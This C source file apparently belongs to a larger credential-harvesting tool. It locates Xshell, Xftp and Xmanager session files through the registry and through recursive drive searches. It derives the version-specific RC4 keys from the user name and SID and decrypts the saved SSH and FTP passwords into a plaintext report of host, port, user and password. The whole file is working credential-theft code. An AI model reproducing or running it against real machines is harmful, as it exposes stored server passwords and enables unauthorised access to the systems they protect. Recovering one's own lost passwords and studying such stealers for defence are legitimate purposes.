/* Xshell/Xftp credential decryption — mirrors Go's xshell/xshell.go */
#include "xshell.h"
#include "browser/utils.h"
#include "browser/crypto.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <winreg.h>

static char* rev(const char* s) {
    int l = (int)strlen(s); char* r = (char*)malloc(l+1);
    for (int i=0;i<l;i++) r[i]=s[l-1-i]; r[l]=0; return r;
}

/* Read file with UTF-16 detection */
static char* read_xsh_file(const char* path) {
    FILE* f = fopen(path, "rb"); if (!f) return NULL;
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }
    unsigned char* raw = (unsigned char*)malloc(sz);
    if (!raw) { fclose(f); return NULL; }
    if (fread(raw, 1, sz, f) != (size_t)sz) { free(raw); fclose(f); return NULL; }
    fclose(f);

    char* result;
    if (sz >= 2 && raw[0] == 0xFF && raw[1] == 0xFE) {
        /* UTF-16 LE with BOM */
        int wlen = (int)(sz - 2) / 2;
        wchar_t* wbuf = (wchar_t*)malloc((wlen + 1) * sizeof(wchar_t));
        memcpy(wbuf, raw + 2, wlen * 2); wbuf[wlen] = 0;
        int n = WideCharToMultiByte(CP_UTF8, 0, wbuf, wlen, NULL, 0, NULL, NULL);
        result = (char*)malloc(n + 1);
        WideCharToMultiByte(CP_UTF8, 0, wbuf, wlen, result, n, NULL, NULL); result[n] = 0;
        free(wbuf);
    } else {
        result = (char*)malloc(sz + 1);
        memcpy(result, raw, sz); result[sz] = 0;
    }
    free(raw);
    return result;
}

static void parse_xsh(const char* content, char* host, int hs,
                      char* user, int us, char* encpw, int es,
                      char* version, int vs, char* port, int ps) {
    const char* p = content;
    while (*p) {
        const char* nl = strchr(p, '\n'); if (!nl) nl = p + strlen(p);
        char line[1024]; int ll = (int)(nl-p); if(ll>1023) ll=1023;
        memcpy(line, p, ll); line[ll] = 0;
        while (ll > 0 && (line[ll-1]=='\r'||line[ll-1]=='\n')) line[--ll]=0;
        if (ll == 0) {
            p = (*nl) ? nl + 1 : nl;
            continue;
        }
        if (strncmp(line,"Host=",5)==0) strncpy(host,line+5,hs-1);
        else if (strncmp(line,"UserName=",9)==0) strncpy(user,line+9,us-1);
        else if (strncmp(line,"Password=",9)==0) strncpy(encpw,line+9,es-1);
        else if (strncmp(line,"Version=",8)==0) strncpy(version,line+8,vs-1);
        else if (strncmp(line,"Port=",5)==0) strncpy(port,line+5,ps-1);
        p = (*nl) ? nl + 1 : nl;
    }
}

static char* xsh_decrypt(const char* encpw, const char* version, const char* user, const char* sid) {
    uint8_t* data; int dl; int bl=(int)strlen(encpw);
    data = (uint8_t*)malloc(bl); dl = base64_decode(encpw, data, bl);
    if (dl <= 0x20) { free(data); return NULL; }
    int pass_len = dl - 0x20;
    uint8_t* pass_data = data;

    uint8_t key[32]; int kl = 0;
    if (strncmp(version, "5.0", 3) == 0 || strncmp(version, "4", 1) == 0 || strncmp(version, "3", 1) == 0 || strncmp(version, "2", 1) == 0) {
        md5_hash((uint8_t*)"!X@s#h$e%l^l&", 10, key); kl = 16;
    } else if (strncmp(version, "5.1", 3) == 0 || strncmp(version, "5.2", 3) == 0) {
        sha256_hash((uint8_t*)sid, (int)strlen(sid), key); kl = 32;
    } else if (strncmp(version, "5", 1) == 0 || strncmp(version, "6", 1) == 0 || strncmp(version, "7.0", 3) == 0) {
        char tmp[512]; snprintf(tmp, sizeof(tmp), "%s%s", user, sid);
        sha256_hash((uint8_t*)tmp, (int)strlen(tmp), key); kl = 32;
    } else if (strncmp(version, "7", 1) == 0 || strncmp(version, "8", 1) == 0) {
        char* rn = rev(user); char tmp[512];
        snprintf(tmp, sizeof(tmp), "%s%s", rn, sid); free(rn); rn = rev(tmp);
        sha256_hash((uint8_t*)rn, (int)strlen(rn), key); kl = 32; free(rn);
    } else {
        free(data); return NULL;
    }

    uint8_t* dec = (uint8_t*)malloc(pass_len + 1);
    rc4_crypt(key, kl, pass_data, pass_len, dec);
    dec[pass_len] = 0;
    free(data);
    return (char*)dec;
}

static int get_user_sid(char* name, int ns, char* sid, int ss) {
    DWORD uns = ns; GetUserNameA(name, &uns);
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList", 0, KEY_READ, &hk) != ERROR_SUCCESS) return -1;
    DWORD idx = 0; char sk[256];
    while (RegEnumKeyA(hk, idx++, sk, sizeof(sk)) == ERROR_SUCCESS) {
        if (strncmp(sk, "S-1-5-21", 8) == 0) {
            char pp[384]; snprintf(pp, sizeof(pp), "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\%s", sk);
            HKEY hpk;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, pp, 0, KEY_READ, &hpk) == ERROR_SUCCESS) {
                char pip[MAX_PATH]; DWORD ps = sizeof(pip);
                if (RegQueryValueExA(hpk, "ProfileImagePath", NULL, NULL, (BYTE*)pip, &ps) == ERROR_SUCCESS) {
                    /* exact last-component match: "Admin" must not match "C:\Users\Administrator" */
                    const char* last = strrchr(pip, '\\');
                    last = last ? last + 1 : pip;
                    if (_stricmp(last, name) == 0) { strncpy(sid, sk, ss-1); sid[ss-1] = 0; RegCloseKey(hpk); RegCloseKey(hk); return 0; }
                }
                RegCloseKey(hpk);
            }
        }
    }
    RegCloseKey(hk); return -1;
}

static const char* do_scan(const char* custom_path, const char* session_dir, const char* label) {
    static char result[65536]; int rp = 0; result[0] = 0;

    printf("Scanning %s...\n", label);

    char un[256], sid[256];
    if (get_user_sid(un, sizeof(un), sid, sizeof(sid)) != 0) return NULL;

    char paths[4][MAX_PATH]; int pc = 0;
    if (custom_path && custom_path[0]) { strncpy(paths[pc++], custom_path, MAX_PATH-1); }
    else {
        /* Read registry for NetSarang user data paths */
        HKEY hk;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\NetSarang\\Common", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
            DWORD idx = 0; char ver[64];
            while (RegEnumKeyA(hk, idx++, ver, sizeof(ver)) == ERROR_SUCCESS) {
                if (ver[0] >= '0' && ver[0] <= '9') {
                    char rp2[512]; snprintf(rp2, sizeof(rp2), "Software\\NetSarang\\Common\\%s\\UserData", ver);
                    HKEY huk;
                    if (RegOpenKeyExA(HKEY_CURRENT_USER, rp2, 0, KEY_READ, &huk) == ERROR_SUCCESS) {
                        char udp[MAX_PATH]; DWORD us = sizeof(udp);
                        if (RegQueryValueExA(huk, "UserDataPath", NULL, NULL, (BYTE*)udp, &us) == ERROR_SUCCESS && pc < 4) {
                            strncpy(paths[pc++], udp, MAX_PATH-1);
                        }
                        RegCloseKey(huk);
                    }
                }
            }
            RegCloseKey(hk);
        }
    }

    bool registry_seen = pc > 0;

    for (int pi = 0; pi < pc && pi < 4; pi++) {
        char sp[MAX_PATH];
        /* Determine sessions path */
        const char* dp = paths[pi];
        int dpl = (int)strlen(dp);
        if (dpl > 0 && (dp[dpl-1]=='8'||dp[dpl-1]=='7'||dp[dpl-1]=='6'||dp[dpl-1]=='5'))
            snprintf(sp, sizeof(sp), "%s\\%s\\Sessions", dp, session_dir);
        else
            strncpy(sp, dp, sizeof(sp)-1);

        if (!path_exists(sp)) continue;

        char srch[MAX_PATH];
        snprintf(srch, sizeof(srch), "%s\\*", sp);
        WIN32_FIND_DATAA fd;
        HANDLE hf = FindFirstFileA(srch, &fd);
        if (hf == INVALID_HANDLE_VALUE) continue;

        const char* ext = (strcmp(session_dir, "Xftp") == 0) ? ".xfp" : ".xsh";
        do {
            if (fd.cFileName[0] == '.') continue;
            const char* fext = strrchr(fd.cFileName, '.');
            if (!fext || _stricmp(fext, ext) != 0) continue;

            char fp[MAX_PATH]; snprintf(fp, sizeof(fp), "%s\\%s", sp, fd.cFileName);
            char* content = read_xsh_file(fp);
            if (!content) continue;

            char host[256]="", user[256]="", encpw[512]="", ver[64]="7.0", port[16]="22";
            parse_xsh(content, host, sizeof(host), user, sizeof(user), encpw, sizeof(encpw), ver, sizeof(ver), port, sizeof(port));
            free(content);

            if (encpw[0]) {
                char* pw = xsh_decrypt(encpw, ver, un, sid);
                if (pw) {
                    rp += snprintf(result + rp, sizeof(result) - rp,
                        "Host: %s\nPort: %s\nUser: %s\nPassword: %s\nVersion: %s\n\n", host, port, user, pw, ver);
                    free(pw);
                }
            }
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
    }

    /* If not found via registry, search C: D: only after registry/process evidence exists. */
    if (!result[0] && (registry_seen || process_exists("Xshell.exe") || process_exists("Xftp.exe"))) {
        /* xshell/xftp/xmanager share one NetSarang parent — cache the full-drive
         * search result so the three modules only walk the drives once. */
        static char g_ns_parent[MAX_PATH];
        static bool g_ns_parent_done = false;

        const char* drives[] = {"C:\\", "D:\\", NULL};
        char found[MAX_PATH] = {0};
        if (g_ns_parent_done && g_ns_parent[0]) {
            snprintf(found, sizeof(found), "%s\\%s", g_ns_parent, session_dir);
            if (!path_exists(found)) found[0] = 0;
        }
        if (!found[0]) {
            for (int di = 0; drives[di]; di++) {
                char* f = find_dir_recursive(drives[di], session_dir, 5);
                if (f) {
                    strncpy(found, f, sizeof(found) - 1);
                    /* remember the common NetSarang parent for sibling modules */
                    char* slash = strrchr(found, '\\');
                    if (slash) {
                        size_t pl = (size_t)(slash - found);
                        if (pl < sizeof(g_ns_parent)) {
                            memcpy(g_ns_parent, found, pl);
                            g_ns_parent[pl] = 0;
                            g_ns_parent_done = true;
                        }
                    }
                    free(f);
                    break;
                }
            }
        }
        if (found[0]) {
                char sp[MAX_PATH];
                snprintf(sp, sizeof(sp), "%s\\Sessions", found);
                if (path_exists(sp)) {
                    char srch[MAX_PATH]; snprintf(srch, sizeof(srch), "%s\\*", sp);
                    WIN32_FIND_DATAA fd2; HANDLE hf2 = FindFirstFileA(srch, &fd2);
                    if (hf2 != INVALID_HANDLE_VALUE) {
                        const char* ext = (strcmp(session_dir, "Xftp") == 0) ? ".xfp" : ".xsh";
                        do {
                            if (fd2.cFileName[0] == '.') continue;
                            const char* fext = strrchr(fd2.cFileName, '.');
                            if (!fext || _stricmp(fext, ext) != 0) continue;
                            char fp[MAX_PATH]; snprintf(fp, sizeof(fp), "%s\\%s", sp, fd2.cFileName);
                            char* content = read_xsh_file(fp);
                            if (!content) continue;
                            char host[256]="", user[256]="", encpw[512]="", ver[64]="7.0", port[16]="22";
                            parse_xsh(content, host, sizeof(host), user, sizeof(user), encpw, sizeof(encpw), ver, sizeof(ver), port, sizeof(port));
                            free(content);
                            if (encpw[0]) {
                                char* pw = xsh_decrypt(encpw, ver, un, sid);
                                if (pw) {
                                    rp += snprintf(result + rp, sizeof(result) - rp,
                                        "Host: %s\nPort: %s\nUser: %s\nPassword: %s\nVersion: %s\n\n", host, port, user, pw, ver);
                                    free(pw);
                                }
                            }
                        } while (FindNextFileA(hf2, &fd2));
                        FindClose(hf2);
                    }
                }
        }
    }

    return result[0] ? result : NULL;
}

const char* xshell_scan(const char* custom_path) { return do_scan(custom_path, "Xshell", "Xshell"); }
const char* xftp_scan(const char* custom_path)   { return do_scan(custom_path, "Xftp", "Xftp"); }
/* Xmanager sessions share the NetSarang .xsh format and key derivation */
const char* xmanager_scan(const char* custom_path) { return do_scan(custom_path, "Xmanager", "Xmanager"); }
